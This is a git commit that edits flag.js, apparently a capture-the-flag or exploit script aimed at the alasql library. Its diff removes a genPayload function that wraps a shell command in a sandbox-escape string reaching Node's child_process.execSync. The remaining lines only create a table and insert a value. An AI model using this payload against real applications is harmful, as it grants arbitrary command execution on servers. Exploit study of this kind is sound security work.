430d61925aa00ec13edf9b555c986d985cbd7b3c
vr2 <hydw9898@gmail.com>
2024-11-14 08:25:58 +0900

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,10 +1,5 @@
 alasql("CREATE table example1(a INT)");
 alasql("INSERT INTO example1 VALUES (1337)");
 
-const genPayload = command => `
-new Function(
-    'return this.process.mainModule.require'
-)()('child_process').execSync(${JSON.stringify(command)})
-`;
 
 
